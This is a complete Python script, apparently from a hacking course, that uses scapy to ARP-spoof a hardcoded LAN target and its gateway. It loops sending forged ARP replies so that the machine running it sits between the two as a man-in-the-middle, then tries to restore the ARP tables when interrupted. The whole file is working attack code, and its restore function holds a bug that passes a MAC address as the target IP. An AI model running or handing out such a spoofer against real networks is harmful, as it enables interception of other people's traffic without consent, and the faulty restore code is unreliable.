import time
import scapy.all as scapy
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_ip = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = source_mac, psrc = source_ip)
    scapy.send(packet, count = 4, verbose = False)

target_ip = "192.168.100.104"
gateaway_ip = "192.168.100.1"

sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateaway_ip)
        spoof(gateaway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packets sent: " + str(sent_packet_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Limpiando tablas ARP")
    restore(target_ip, gateaway_ip)
    restore(gateaway_ip, target_ip)
    print("[+] ARP Spoofer cerrado correctamente.")